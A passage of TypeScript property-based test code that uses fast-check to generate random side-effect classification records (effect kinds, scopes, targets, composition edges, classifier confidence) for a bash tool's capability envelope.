      if (
        (t.kind === "path" || t.kind === "host" || t.kind === "url") &&
        t.normalized === undefined
      ) {
        out = { ...out, normalized: t.value.length > 0 ? t.value : "/x" };
      }
      return out;
    });

  const segment = fc.record({
    effectKinds: nonEmpty(kind),
    scopes: nonEmpty(scope),
    targets: fc.array(target, { maxLength: 2 }),
    modifiers: fc.array(modifier, { maxLength: 2 }),
  });

  return fc
    .record({
      segments: fc.array(segment, { minLength: 1, maxLength: 3 }),
      kind: fc.constantFrom(...CompositionKind.options),
      confidence: fc.constantFrom(...ClassifierConfidence.options),
      reasons: fc.array(fc.string(), { maxLength: 3 }),
      broad: fc.boolean(),
      envelope: nonEmpty(kind),
    })
    .chain((r) => {
      const n = r.segments.length;
      const edge = fc.record({
        from: fc.nat({ max: n - 1 }),
        to: fc.nat({ max: n - 1 }),
        relation: fc.constantFrom(...EdgeRelation.options),
      });
      return fc.array(edge, { maxLength: 4 }).map((edges) => {
        const uni = <K extends "effectKinds" | "scopes" | "modifiers">(key: K) => [
          ...new Set(r.segments.flatMap((s) => s[key] as string[])),
        ];
        const effectKinds = uni("effectKinds");
        const scopes = uni("scopes");
        return {
          taxonomyVersion: SIDE_EFFECT_TAXONOMY_VERSION,
          staticCapability: { toolName: "bash", effectEnvelope: r.envelope, broad: r.broad },
          dynamic: {
            effectKinds: effectKinds.length ? effectKinds : ["unknown"],
            scopes: scopes.length ? scopes : ["unknown"],
            targets: r.segments.flatMap((s) => s.targets),
            modifiers: uni("modifiers"),
            composition: { kind: r.kind, segments: r.segments, edges },
            classifier: { name: "c", version: "1", confidence: r.confidence, reasons: r.reasons },
          },
        };
      });
    });
}
